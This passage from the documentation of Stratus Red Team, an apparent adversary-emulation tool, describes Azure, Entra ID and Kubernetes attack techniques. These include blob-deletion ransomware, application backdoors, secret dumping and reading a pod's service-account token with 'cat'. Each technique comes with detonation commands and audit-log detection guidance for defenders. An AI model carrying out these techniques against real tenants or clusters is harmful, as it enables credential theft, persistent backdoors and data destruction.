}\n}\n</code></pre>"},{"location":"attack-techniques/azure/azure.impact.blob-ransomware-individual-file-deletion/","title":"Azure ransomware via Storage Account Blob deletion","text":"<p>Platform: Azure</p>"},{"location":"attack-techniques/azure/azure.impact.blob-ransomware-individual-file-deletion/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Impact</li> </ul> </li> </ul>"},{"location":"attack-techniques/azure/azure.impact.blob-ransomware-individual-file-deletion/#description","title":"Description","text":"<p>Simulates Azure Storage ransomware activity that empties a storage account through individual Blob deletion, then uploads a ransom note.</p> <p>Warm-up: </p> <ul> <li>Create an Azure Storage Account, with versioning enabled</li> <li>Create Storage Containers in the Storage Account, each with a large number blobs with random content and extensions</li> </ul> <p>Detonation: </p> <ul> <li>List all available storage containers and their blobs and their versions in the bucket</li> <li>Delete all blobs in each container one by one, using DeleteBlob</li> <li>List and delete all blobs again to delete any backups created by versioning</li> <li>Upload a ransom note to the storage account</li> </ul> <p>Note: The attack does not need to disable versioning, which does not protect against ransomware. This attack removes all versions of the objects in the bucket. </p> <p>References: Storm-0501\u2019s evolving techniques lead to cloud-based ransomware Inside the attack chain: threat activity targeting Azure Blob Storage</p>"},{"location":"attack-techniques/azure/azure.impact.blob-ransomware-individual-file-deletion/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate azure.impact.blob-ransomware-individual-file-deletion\n</code></pre>"},{"location":"attack-techniques/azure/azure.impact.blob-ransomware-individual-file-deletion/#detection","title":"Detection","text":"<p>You can detect ransomware activity by identifying abnormal patterns of blobs being downloaded or deleted in a storage account.  In general, this can be done through Blob storage events. Blob storage events are resource logs, which require configuring diagnostic settings to enable.</p> <p>Sample Blob storage event <code>DeleteBlob</code>, shortened for readability:</p> <pre><code>{\n  \"operationName\": \"DeleteBlob\",\n  \"category\": \"StorageDelete\",\n  \"properties\": {\n    \"accountName\":\"my-storage-account\",\n    \"objectKey\": \"/my-storage-account/storage-container/somefolder/foo.bar\"\n  },\n  \"resourceId\":\"/subscriptions/ac382a89-52bf-4923-8abd-f1e4791cd48f/resourceGroups/my-resource-group/providers/Microsoft.Storage/storageAccounts/my-storage-account/blobServices/default\"\n}\n</code></pre>"},{"location":"attack-techniques/azure/azure.impact.resource-lock/","title":"Delete Azure resource lock","text":"<p>slow idempotent </p> <p>Platform: Azure</p>"},{"location":"attack-techniques/azure/azure.impact.resource-lock/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Impact</li> </ul> </li> </ul>"},{"location":"attack-techniques/azure/azure.impact.resource-lock/#description","title":"Description","text":"<p>NOTE: Due to resource lock delays, the warmup and cleanup steps of this technique can take several minutes.</p> <p>Disable Azure resource locks to allow resource deletion. Resource locks can be applied to any Azure resource, resource group, or subscription. This technique uses a lock on a resource group containing an Azure storage account as an example.</p> <p>Warm-up:</p> <ul> <li>Create a storage account</li> <li>Set storage account as ReadOnly using an Azure resource lock at the resource group level</li> </ul> <p>Detonation:</p> <ul> <li>Delete Azure resource lock</li> </ul> <p>References:</p> <ul> <li>https://www.microsoft.com/en-us/security/blog/2025/08/27/storm-0501s-evolving-techniques-lead-to-cloud-based-ransomware/</li> <li>https://learn.microsoft.com/azure/azure-resource-manager/management/lock-resources</li> </ul>"},{"location":"attack-techniques/azure/azure.impact.resource-lock/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate azure.impact.resource-lock\n</code></pre>"},{"location":"attack-techniques/azure/azure.impact.resource-lock/#detection","title":"Detection","text":"<p>Monitor Azure Activity Logs for resource lock changes, specifically <code>Microsoft.Authorization/locks/delete</code> operations. Once an attacker has removed a resource lock, they are able to modify and delete resources that were protected by that lock.</p> <p>Sample Azure Activity Log event to monitor:</p> <pre><code>    \"operationName\": {\n        \"value\": \"Microsoft.Authorization/locks/delete\",\n        \"localizedValue\": \"Delete management locks\"\n    },\n    \"properties\": {\n        \"properties\": {\n        \"eventCategory\": \"Administrative\",\n        \"entity\": \"/subscriptions/[SUBSCRIPTION-ID]/resourceGroups/stratus-red-team-lock-storage-71mu/providers/Microsoft.Authorization/locks/stratus-storage-lock-71mu\",\n        \"message\": \"Microsoft.Authorization/locks/delete\",\n        \"hierarchy\": \"[REMOVED]\"\n    }\n</code></pre>"},{"location":"attack-techniques/azure/azure.persistence.create-bastion-shareable-link/","title":"Create Azure VM Bastion shareable link","text":"<p>slow </p> <p>Platform: Azure</p>"},{"location":"attack-techniques/azure/azure.persistence.create-bastion-shareable-link/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Persistence</li> </ul> </li> </ul>"},{"location":"attack-techniques/azure/azure.persistence.create-bastion-shareable-link/#description","title":"Description","text":"<p>By utilizing the 'shareable link' feature on Bastions where it is enabled, an attacker can create a link to allow access to a virtual machine (VM) from untrusted networks. Public links generated for an Azure Bastion can allow VM network access to anyone with the generated URL.</p> <p>References:</p> <ul> <li>https://blog.karims.cloud/2022/11/26/yet-another-azure-vm-persistence.html</li> <li>https://learn.microsoft.com/en-us/azure/bastion/shareable-link</li> <li>https://microsoft.github.io/Azure-Threat-Research-Matrix/Persistence/AZT509/AZT509/</li> </ul> <p>Warm-up: </p> <ul> <li>Create a VM and VNet</li> <li>Create an Azure Bastion host with access to the VM, and shareable links enabled</li> </ul> <p>NOTE: Warm-up and cleanup can each take 10-15 minutes to create and destroy the Azure Bastion instance</p> <p>Detonation: </p> <ul> <li>Create an Azure Bastion shareable link with access to the VM</li> </ul>"},{"location":"attack-techniques/azure/azure.persistence.create-bastion-shareable-link/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate azure.persistence.create-bastion-shareable-link\n</code></pre>"},{"location":"attack-techniques/azure/azure.persistence.create-bastion-shareable-link/#detection","title":"Detection","text":"<p>Identify Azure events of type <code>Microsoft.Network/bastionHosts/createshareablelinks/action</code> and <code>Microsoft.Network/bastionHosts/getShareablelinks/action</code>. A sample of <code>createshareablelinks</code> is shown below (redacted for clarity).</p> <pre><code>{\n  {\n    \"category\": {\n        \"value\": \"Administrative\",\n        \"localizedValue\": \"Administrative\"\n    },\n    \"level\": \"Informational\",\n    \"operationName\": {\n        \"value\": \"Microsoft.Network/bastionHosts/createshareablelinks/action\",\n        \"localizedValue\": \"Creates shareable urls for the VMs under a bastion and returns the urls\"\n    },\n    \"resourceGroupName\": \"stratus-red-team-shareable-link-rg-tz6o\",\n    \"resourceProviderName\": {\n        \"value\": \"Microsoft.Network\",\n        \"localizedValue\": \"Microsoft.Network\"\n    },\n    \"resourceType\": {\n        \"value\": \"Microsoft.Network/bastionHosts\",\n        \"localizedValue\": \"Microsoft.Network/bastionHosts\"\n    },\n    \"resourceId\": \"[removed]/resourceGroups/stratus-red-team-shareable-link-rg-tz6o/providers/Microsoft.Network/bastionHosts/stratus-red-team-shareable-link-bastion-tz6o\",\n    \"status\": {\n        \"value\": \"Succeeded\",\n        \"localizedValue\": \"Succeeded\"\n    },\n    \"subStatus\": {\n        \"value\": \"\",\n        \"localizedValue\": \"\"\n    },\n    \"properties\": {\n        \"eventCategory\": \"Administrative\",\n        \"entity\": \"[removed]/resourceGroups/stratus-red-team-shareable-link-rg-tz6o/providers/Microsoft.Network/bastionHosts/stratus-red-team-shareable-link-bastion-tz6o\",\n        \"message\": \"Microsoft.Network/bastionHosts/createshareablelinks/action\",\n        \"hierarchy\": \"[removed]\"\n    },\n}\n</code></pre>"},{"location":"attack-techniques/entra-id/","title":"Entra ID","text":"<p>This page contains the Stratus attack techniques for Entra ID, grouped by MITRE ATT&amp;CK Tactic. Note that some Stratus attack techniques may correspond to more than a single ATT&amp;CK Tactic.</p>"},{"location":"attack-techniques/entra-id/#persistence","title":"Persistence","text":"<ul> <li> <p>Backdoor Entra ID application through service principal</p> </li> <li> <p>Backdoor Entra ID application</p> </li> <li> <p>Create Guest User</p> </li> <li> <p>Create Hidden Scoped Role Assignment Through HiddenMembership AU</p> </li> <li> <p>Create Application</p> </li> <li> <p>Create Sticky Backdoor User Through Restricted Management AU</p> </li> </ul>"},{"location":"attack-techniques/entra-id/#privilege-escalation","title":"Privilege Escalation","text":"<ul> <li> <p>Backdoor Entra ID application through service principal</p> </li> <li> <p>Backdoor Entra ID application</p> </li> <li> <p>Create Application</p> </li> </ul>"},{"location":"attack-techniques/entra-id/entra-id.persistence.backdoor-application-sp/","title":"Backdoor Entra ID application through service principal","text":"<p>Platform: Entra ID</p>"},{"location":"attack-techniques/entra-id/entra-id.persistence.backdoor-application-sp/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Persistence</li> </ul> </li> <li>Privilege Escalation</li> </ul>"},{"location":"attack-techniques/entra-id/entra-id.persistence.backdoor-application-sp/#description","title":"Description","text":"<p>Backdoors an existing Entra ID application by creating a new credential on the associated service principal.</p> <p>Warm-up:</p> <ul> <li>Create an Entra ID application and associated service principal</li> <li>Assign it the <code>Directory Readers</code> role at the tenant level (for illustration purposes)</li> </ul> <p>Detonation:</p> <ul> <li>Backdoor the Entra ID application by creating a new credential on the associated service principal</li> </ul> <p>Notes: The warm-up mimics what happens when you create an App Registration through the Azure portal.  When you use the Azure portal, creating an App Registration automatically creates an associated service principal.  When using the Microsoft Graph API, the service principal needs to be created separately. </p> <p>References:</p> <ul> <li>https://www.microsoft.com/en-us/security/blog/2023/12/12/threat-actors-misuse-oauth-applications-to-automate-financially-driven-attacks/</li> <li>https://www.inversecos.com/2021/10/how-to-backdoor-azure-applications-and.html</li> <li>https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5</li> <li>https://redfoxsec.com/blog/azure-privilege-escalation-via-service-principal/</li> </ul>"},{"location":"attack-techniques/entra-id/entra-id.persistence.backdoor-application-sp/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate entra-id.persistence.backdoor-application-sp\n</code></pre>"},{"location":"attack-techniques/entra-id/entra-id.persistence.backdoor-application-sp/#detection","title":"Detection","text":"<p>Using Entra ID audit logs with the activity type <code>Add service principal credentials</code>.</p>"},{"location":"attack-techniques/entra-id/entra-id.persistence.backdoor-application/","title":"Backdoor Entra ID application","text":"<p>Platform: Entra ID</p>"},{"location":"attack-techniques/entra-id/entra-id.persistence.backdoor-application/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Persistence</li> </ul> </li> <li>Privilege Escalation</li> </ul>"},{"location":"attack-techniques/entra-id/entra-id.persistence.backdoor-application/#description","title":"Description","text":"<p>Backdoors an existing Entra ID application by creating a new password credential.</p> <p>Warm-up:</p> <ul> <li>Create an Entra ID application and associated service principal</li> <li>Assign it the <code>Directory Readers</code> role at the tenant level (for illustration purposes)</li> </ul> <p>Detonation:</p> <ul> <li>Backdoor the Entra ID application by creating a new password credential</li> </ul> <p>Notes: The warm-up mimics what happens when you create an App Registration through the Azure portal.  When you use the Azure portal, creating an App Registration automatically creates an associated service principal.  When using the Microsoft Graph API, the service principal needs to be created separately. </p> <p>References:</p> <ul> <li>https://www.microsoft.com/en-us/security/blog/2023/12/12/threat-actors-misuse-oauth-applications-to-automate-financially-driven-attacks/</li> <li>https://www.inversecos.com/2021/10/how-to-backdoor-azure-applications-and.html</li> <li>https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5</li> <li>https://redfoxsec.com/blog/azure-privilege-escalation-via-service-principal/</li> </ul>"},{"location":"attack-techniques/entra-id/entra-id.persistence.backdoor-application/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate entra-id.persistence.backdoor-application\n</code></pre>"},{"location":"attack-techniques/entra-id/entra-id.persistence.backdoor-application/#detection","title":"Detection","text":"<p>Using Entra ID audit logs with the activity type <code>Update application \u2013 Certificates and secrets management</code>.</p>"},{"location":"attack-techniques/entra-id/entra-id.persistence.guest-user/","title":"Create Guest User","text":"<p>Platform: Entra ID</p>"},{"location":"attack-techniques/entra-id/entra-id.persistence.guest-user/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Persistence</li> </ul> </li> </ul>"},{"location":"attack-techniques/entra-id/entra-id.persistence.guest-user/#description","title":"Description","text":"<p>Invites an external guest user in the tenant.</p> <p>Warm-up: None</p> <p>Detonation:</p> <ul> <li>Invite guest user (without generating an invitation email)</li> </ul> <p>References:</p> <ul> <li>https://securitylabs.datadoghq.com/cloud-security-atlas/attacks/inviting-external-users/</li> <li>https://derkvanderwoude.medium.com/azure-subscription-hijacking-and-cryptomining-86c2ac018983</li> <li>https://dirkjanm.io/assets/raw/US-22-Mollema-Backdooring-and-hijacking-Azure-AD-accounts_final.pdf</li> </ul> <p>Note</p> <p>By default, Stratus Red Team invites the e-mail <code>stratus-red-team@example.com</code>. However, you can override this behavior by setting the environment variable <code>STRATUS_RED_TEAM_ATTACKER_EMAIL</code>, for instance:</p> <pre><code>export STRATUS_RED_TEAM_ATTACKER_EMAIL=\"you@domain.tld\"\nstratus detonate entra-id.persistence.guest-user\n</code></pre>"},{"location":"attack-techniques/entra-id/entra-id.persistence.guest-user/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate entra-id.persistence.guest-user\n</code></pre>"},{"location":"attack-techniques/entra-id/entra-id.persistence.guest-user/#detection","title":"Detection","text":"<p>Using Entra ID audit logs with the specific activity types:</p> <ul> <li><code>Add user</code></li> <li><code>Invite external user</code></li> <li><code>Add user sponsor</code></li> </ul> <p>When the invited user accepts the invite, an additional event <code>Redeem external user invite</code> is logged. </p> <p>Sample events, shortened for clarity:</p> <pre><code>{\n  \"category\": \"UserManagement\",\n  \"result\": \"success\",\n  \"activityDisplayName\": \"Invite external user\",\n  \"loggedByService\": \"Invited Users\",\n  \"initiatedBy\": {\n    \"user\": {\n      \"userPrincipalName\": \"&lt;inviter@tenant.tld&gt;\",\n    }\n  },\n  \"userAgent\": \"\",\n  \"targetResources\": [\n    {\n      \"displayName\": \"&lt;invited user display name&gt;\",\n      \"type\": \"User\",\n      \"userPrincipalName\": \"&lt;invited-user-email&gt;#EXT#@&lt;tenant.tld&gt;\",\n      \"groupType\": null,\n      \"modifiedProperties\": []\n    }\n  ],\n  \"additionalDetails\": [\n    {\n      \"key\": \"invitedUserEmailAddress\",\n      \"value\": \"&lt;invited-user-email&gt;\"\n    }\n  ]\n}\n{\n  \"category\": \"UserManagement\",\n  \"result\": \"success\",\n  \"resultReason\": null,\n  \"activityDisplayName\": \"Redeem external user invite\",\n  \"loggedByService\": \"B2B Auth\",\n  \"initiatedBy\": {\n    \"user\": {\n      \"userPrincipalName\": \"&lt;invited-user-email&gt;\",\n      \"ipAddress\": \"&lt;invited-user-ip&gt;\"\n    }\n  },\n  \"targetResources\": [\n    {\n      \"id\": \"d042c4fe-5dd1-44a2-883a-eede6c10608f\",\n      \"displayName\": \"UPN: &lt;invited-user-email&gt;#EXT#&lt;tenant.tld&gt;, Email: &lt;invited-user-email&gt;, InvitationId: 4c93fc70-169a-411f-8cf7-aff732f8c7b9, Source: One Time Passcode\",\n      \"type\": \"User\",\n      \"userPrincipalName\": \"&lt;invited-user-email&gt;#EXT#&lt;tenant.tld&gt;\"\n    }\n  ]\n}\n</code></pre>"},{"location":"attack-techniques/entra-id/entra-id.persistence.hidden-au/","title":"Create Hidden Scoped Role Assignment Through HiddenMembership AU","text":"<p>Platform: Entra ID</p>"},{"location":"attack-techniques/entra-id/entra-id.persistence.hidden-au/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Persistence</li> </ul> </li> </ul>"},{"location":"attack-techniques/entra-id/entra-id.persistence.hidden-au/#description","title":"Description","text":"<p>Creates an Administrative Unit (AU) with hidden membership, and a scoped role assignment over this AU. This simulates an attacker attempting to conceal the scope of a scoped role assignment using hidden AU membership.</p> <p>Warm-up:</p> <ul> <li>Create the target (victim) Entra ID user</li> </ul> <p>Detonation:</p> <ul> <li>Create an administrative unit with hidden membership</li> <li>Create a backdoor Entra ID user</li> <li>Add the target (victim) user to the administrative unit</li> <li>Assign the backdoor user with Privileged Administration Administrator rights over the administrative unit</li> </ul> <p>This simulates an attacker that indirectly persists their access.  The backdoor user can now perform privileged operations over any user in the administrative unit, which can be used to escalate privileges or maintain access, for instance by resetting the target user's password.</p> <p>References:</p> <ul> <li>https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/administrative-units</li> </ul>"},{"location":"attack-techniques/entra-id/entra-id.persistence.hidden-au/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate entra-id.persistence.hidden-au\n</code></pre>"},{"location":"attack-techniques/entra-id/entra-id.persistence.hidden-au/#detection","title":"Detection","text":"<p>Using Entra ID audit logs with the specific activity types:</p> <p>For <code>Service: Core Directory</code> and <code>Category: AdministrativeUnit</code>:</p> <ul> <li><code>Add administrative unit</code></li> <li><code>Add member to administrative unit</code></li> </ul> <p>For <code>Service: Core Directory</code> and <code>Category: RoleManagement</code>:</p> <ul> <li><code>Add scoped member to role</code></li> </ul>"},{"location":"attack-techniques/entra-id/entra-id.persistence.new-application/","title":"Create Application","text":"<p>Platform: Entra ID</p>"},{"location":"attack-techniques/entra-id/entra-id.persistence.new-application/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Persistence</li> </ul> </li> <li>Privilege Escalation</li> </ul>"},{"location":"attack-techniques/entra-id/entra-id.persistence.new-application/#description","title":"Description","text":"<p>Creates a new Entra ID application to backdoor the tenant.</p> <p>Warm-up: None</p> <p>Detonation:</p> <ul> <li>Create a new Entra ID application</li> <li>Create a password credential for the application</li> <li>Create a service principal for the application</li> <li>Assign the Global Administrator role to the application</li> <li>Print the command to retrieve a Graph API access token</li> </ul> <p>References:</p> <ul> <li>https://www.microsoft.com/en-us/security/blog/2023/12/12/threat-actors-misuse-oauth-applications-to-automate-financially-driven-attacks/</li> <li>https://www.inversecos.com/2021/10/how-to-backdoor-azure-applications-and.html</li> </ul>"},{"location":"attack-techniques/entra-id/entra-id.persistence.new-application/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate entra-id.persistence.new-application\n</code></pre>"},{"location":"attack-techniques/entra-id/entra-id.persistence.new-application/#detection","title":"Detection","text":"<p>Using Entra ID audit logs with the specific activity types:</p> <ul> <li><code>Add application</code></li> <li><code>Update application \u2013 Certificates and secrets management</code></li> <li><code>Add member to role</code></li> </ul>"},{"location":"attack-techniques/entra-id/entra-id.persistence.restricted-au/","title":"Create Sticky Backdoor User Through Restricted Management AU","text":"<p>Platform: Entra ID</p>"},{"location":"attack-techniques/entra-id/entra-id.persistence.restricted-au/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Persistence</li> </ul> </li> </ul>"},{"location":"attack-techniques/entra-id/entra-id.persistence.restricted-au/#description","title":"Description","text":"<p>Creates a restricted management Administrative Unit (AU), and places a backdoor account in it to simulate a protected attacker-controlled user.</p> <p>Warm-up:</p> <ul> <li>Create an Entra ID backdoor user</li> </ul> <p>Detonation:</p> <ul> <li>Create restricted management Administrative Unit</li> <li>Add the backdoor user to the Administrative Unit</li> </ul> <p>References:</p> <ul> <li>https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/administrative-units</li> <li>https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/admin-units-restricted-management</li> </ul> <p>Note: When cleaning up the technique, you might have to wait a few minutes for the user status to update before retrying the cleanup. This is a limitation of Entra ID.</p>"},{"location":"attack-techniques/entra-id/entra-id.persistence.restricted-au/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate entra-id.persistence.restricted-au\n</code></pre>"},{"location":"attack-techniques/entra-id/entra-id.persistence.restricted-au/#detection","title":"Detection","text":"<p>Using Entra ID audit logs with the specific activity types:</p> <ul> <li><code>Add administrative unit</code></li> <li><code>Add member to restricted management administrative unit</code></li> </ul>"},{"location":"attack-techniques/kubernetes/","title":"Kubernetes","text":"<p>This page contains the Stratus attack techniques for Kubernetes, grouped by MITRE ATT&amp;CK Tactic. Note that some Stratus attack techniques may correspond to more than a single ATT&amp;CK Tactic.</p>"},{"location":"attack-techniques/kubernetes/#persistence","title":"Persistence","text":"<ul> <li> <p>Create Admin ClusterRole</p> </li> <li> <p>Create Client Certificate Credential</p> </li> <li> <p>Create Long-Lived Token</p> </li> </ul>"},{"location":"attack-techniques/kubernetes/#privilege-escalation","title":"Privilege Escalation","text":"<ul> <li> <p>Create Admin ClusterRole</p> </li> <li> <p>Container breakout via hostPath volume mount</p> </li> <li> <p>Privilege escalation through node/proxy permissions</p> </li> <li> <p>Run a Privileged Pod</p> </li> </ul>"},{"location":"attack-techniques/kubernetes/#credential-access","title":"Credential Access","text":"<ul> <li> <p>Dump All Secrets</p> </li> <li> <p>Steal Pod Service Account Token</p> </li> </ul>"},{"location":"attack-techniques/kubernetes/k8s.credential-access.dump-secrets/","title":"Dump All Secrets","text":"<p>idempotent </p> <p>Platform: Kubernetes</p>"},{"location":"attack-techniques/kubernetes/k8s.credential-access.dump-secrets/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Credential Access</li> </ul> </li> </ul>"},{"location":"attack-techniques/kubernetes/k8s.credential-access.dump-secrets/#description","title":"Description","text":"<p>Dumps all Secrets from a Kubernetes cluster.  This allow an attacker with the right permissions to trivially access all secrets in the cluster.</p> <p>Warm-up: None</p> <p>Detonation: </p> <ul> <li>Dump secrets using the LIST /api/v1/secrets API</li> <li>This returns all secrets in the K8s clusters, no matter their namespace</li> </ul> <p>References:</p> <ul> <li>https://darkbit.io/blog/the-power-of-kubernetes-rbac-list</li> </ul>"},{"location":"attack-techniques/kubernetes/k8s.credential-access.dump-secrets/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate k8s.credential-access.dump-secrets\n</code></pre>"},{"location":"attack-techniques/kubernetes/k8s.credential-access.dump-secrets/#detection","title":"Detection","text":"<p>Using Kubernetes API server audit logs. In particular, look for list secrets requests that are not performed for a specific namespace (i.e., that apply to all namespaces).</p> <p>Sample event (shortened):</p> <pre><code>{\n  \"apiVersion\": \"audit.k8s.io/v1\",\n  \"stage\": \"ResponseComplete\",\n  \"kind\": \"Event\",\n  \"level\": \"Metadata\",\n  \"requestURI\": \"/api/v1/secrets?limit=500\",\n  \"attributes\": {\n    \"objectRef\": {\n      \"resource\": \"secrets\",\n      \"apiVersion\": \"v1\"\n    },\n    \"http\": {\n      \"url_details\": {\n        \"path\": \"/api/v1/secrets\",\n        \"queryString\": {\n          \"limit\": \"500\"\n        }\n      },\n      \"method\": \"list\"\n    }\n  }\n}\n</code></pre> <p>Some built-in Kubernetes components might need to be excluded from such a detection:</p> <ul> <li>namespace-controller</li> <li>kube-state-metrics</li> <li>apiserver</li> </ul>"},{"location":"attack-techniques/kubernetes/k8s.credential-access.steal-serviceaccount-token/","title":"Steal Pod Service Account Token","text":"<p>idempotent </p> <p>Platform: Kubernetes</p>"},{"location":"attack-techniques/kubernetes/k8s.credential-access.steal-serviceaccount-token/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Credential Access</li> </ul> </li> </ul>"},{"location":"attack-techniques/kubernetes/k8s.credential-access.steal-serviceaccount-token/#description","title":"Description","text":"<p>Steals a service account token from a running pod, by executing a command in the pod and reading /var/run/secrets/kubernetes.io/serviceaccount/token</p> <p>Warm-up: </p> <ul> <li>Create the Stratus Red Team namespace</li> <li>Create a Service Account</li> <li>Create a Pod running under this service account</li> </ul> <p>Detonation: </p> <ul> <li>Execute <code>cat /var/run/secrets/kubernetes.io/serviceaccount/token</code> into the pod to steal its service account token</li> </ul>"},{"location":"attack-techniques/kubernetes/k8s.credential-access.steal-serviceaccount-token/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate k8s.credential-access.steal-serviceaccount-token\n</code></pre>"},{"location":"attack-techniques/kubernetes/k8s.credential-access.steal-serviceaccount-token/#detection","title":"Detection","text":"<p>Using Kubernetes API server audit logs, looking for execution events.</p> <p>Sample event (shortened):</p> <pre><code>{\n    \"objectRef\": {\n        \"resource\": \"pods\",\n        \"subresource\": \"exec\",\n        \"name\": \"stratus-red-team-sample-pod\",\n    },\n    \"http\": {\n        \"url_details\": {\n            \"path\": \"/api/v1/namespaces/stratus-red-team-ubdaslyp/pods/stratus-red-team-sample-pod/exec\",\n            \"queryString\": {\n                \"command\": \"%2Fvar%2Frun%2Fsecrets%2Fkubernetes.io%2Fserviceaccount%2Ftoken\",\n                \"stdout\": \"true\"\n            }\n        },\n        \"method\": \"create\"\n    },\n    \"stage\": \"ResponseStarted\",\n    \"kind\": \"Event\",\n    \"level\": \"RequestResponse\",\n    \"requestURI\": \"/api/v1/namespaces/stratus-red-team-ubdaslyp/pods/stratus-red-team-sample-pod/exec?command=cat&amp;command=%2Fvar%2Frun%2Fsecrets%2Fkubernetes.io%2Fserviceaccount%2Ftoken&amp;stdout=true\",\n}\n</code></pre>"},{"location":"attack-techniques/kubernetes/k8s.persistence.create-admin-clusterrole/","title":"Create Admin ClusterRole","text":"<p>Platform: Kubernetes</p>"},{"location":"attack-techniques/kubernetes/k8s.persistence.create-admin-clusterrole/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Persistence</li> </ul> </li> <li>Privilege Escalation</li> </ul>"},{"location":"attack-techniques/kubernetes/k8s.persistence.create-admin-clusterrole/#description","title":"Description","text":"<p>Creates a Service Account bound to a cluster administrator role.</p> <p>Warm-up: None</p> <p>Detonation: </p> <ul> <li>Create a Cluster Role with administrative permissions</li> <li>Create a Service Account (in the kube-system namespace)</li> <li>Create a Cluster Role Binding</li> <li>Retrieve the long-lived service account token, stored by K8s in a secret</li> </ul>"},{"location":"attack-techniques/kubernetes/k8s.persistence.create-admin-clusterrole/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate k8s.persistence.create-admin-clusterrole\n</code></pre>"},{"location":"attack-techniques/kubernetes/k8s.persistence.create-client-certificate/","title":"Create Client Certificate Credential","text":"<p>idempotent </p> <p>Platform: Kubernetes</p>"},{"location":"attack-techniques/kubernetes/k8s.persistence.create-client-certificate/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Persistence</li> </ul> </li> </ul>"},{"location":"attack-techniques/kubernetes/k8s.persistence.create-client-certificate/#description","title":"Description","text":"<p>Creates a client certificate for a privileged user. This client certificate can be used to authenticate to the cluster.</p> <p>Warm-up: None</p> <p>Detonation:</p> <ul> <li>Create a certificate signing request (CSR)</li> <li>Wait for the CSR to be picked up and return a certificate</li> <li>Print the client-side certificate and private key</li> </ul> <p>Note: This attack technique does not succeed on AWS EKS. Due to apparent undocumented behavior,  the managed EKS control plane does not issue a certificate for the certificate signing request (CSR), even when approved. However, it is still relevant to simulate attacker behavior.</p> <p>Note: The certificate is issued to <code>system:kube-controller-manager</code> because it exists in most clusters, and already has a ClusterRoleBinding to <code>ClusterRole/system:kube-controller-manager</code> which includes privileged permissions, such as access all secrets of the cluster and create tokens for any service account.</p>"},{"location":"attack-techniques/kubernetes/k8s.persistence.create-client-certificate/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate k8s.persistence.create-client-certificate\n</code></pre>"},{"location":"attack-techniques/kubernetes/k8s.persistence.create-client-certificate/#detection","title":"Detection","text":"<p>Using Kubernetes API server audit logs. In particular, look for creation and approval of CSR objects, which do  not relate to standard cluster operation (e.g. Kubelet certificate issuance).</p>"},{"location":"attack-techniques/kubernetes/k8s.persistence.create-token/","title":"Create Long-Lived Token","text":"<p>idempotent </p> <p>Platform: Kubernetes</p>"},{"location":"attack-techniques/kubernetes/k8s.persistence.create-token/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Persistence</li> </ul> </li> </ul>"},{"location":"attack-techniques/kubernetes/k8s.persistence.create-token/#description","title":"Description","text":"<p>Creates a token with a large expiration for a service account. An attacker can create such a long-lived token to easily gain  persistence on a compromised cluster.</p>"},{"location":"attack-techniques/kubernetes/k8s.persistence.create-token/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate k8s.persistence.create-token\n</code></pre>"},{"location":"attack-techniques/kubernetes/k8s.persistence.create-token/#detection","title":"Detection","text":"<p>Using Kubernetes API server audit logs. In particular, look for create service account tokens requests to privileged service accounts, or service accounts inside the kube-system namespace.</p> <pre><code>{\n  \"objectRef\": {\n    \"resource\": \"serviceaccounts\",\n    \"subresource\": \"token\",\n    \"name\": \"clusterrole-aggregation-controller\",\n    \"apiVersion\": \"v1\"\n  },\n  \"http\": {\n    \"url_details\": {\n      \"path\": \"/api/v1/namespaces/kube-system/serviceaccounts/clusterrole-aggregation-controller/token\"\n    },\n    \"method\": \"create\",\n    \"status_code\": 201\n  },\n  \"stage\": \"ResponseComplete\",\n  \"kind\": \"Event\",\n  \"level\": \"Metadata\",\n  \"requestURI\": \"/api/v1/namespaces/kube-system/serviceaccounts/clusterrole-aggregation-controller/token\",\n}\n</code></pre> <p>To reduce false positives, it may be useful to filter out the following attributes:</p> <ul> <li>User name is <code>system:kube-controller-manager</code></li> <li>User group contains <code>system:nodes</code></li> </ul> <p>Notes:</p> <ul> <li> <p>The API server audit log does not contain the requested token lifetime, unless the audit logs level is <code>Request</code> or <code>RequestResponse</code> (which is generally not the case)</p> </li> <li> <p>AWS EKS caps the token lifetime to 1 hour, although the behavior is undocumented and not part of Kubernetes itself.</p> </li> 